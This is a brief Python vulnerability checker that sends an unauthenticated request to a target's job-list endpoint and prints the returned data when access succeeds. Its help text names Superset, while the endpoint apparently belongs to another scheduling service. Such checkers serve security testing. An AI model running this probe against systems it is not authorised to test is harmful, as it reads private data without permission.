import time
import requests
import argparse


def send_req(url_check):
    print('{} runing Check'.format(url_check))
    url = url_check + '/job/list'
    header = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.69',
        'Content-Type': 'application/json;charset=UTF-8',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6'
    }
    data = {
        "appId": 1,
        "index": 0,
        "pageSize": 10
    }
    try:
        response = requests.post(url=url, headers=header, json=data, verify=False, timeout=3).json()
        print(response)
        if response['success']:
            print('{}  Vulnerability exists!\n'.format(url_check))
        time.sleep(1)

    except Exception as e:
        pass


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('--url', '-u', help='Base URL of Superset instance', required=True)
    args = parser.parse_args()
    url = "http://" + args.url # 'http://192.168.88.114:7700' # input("请输入url:")
    send_req(url)
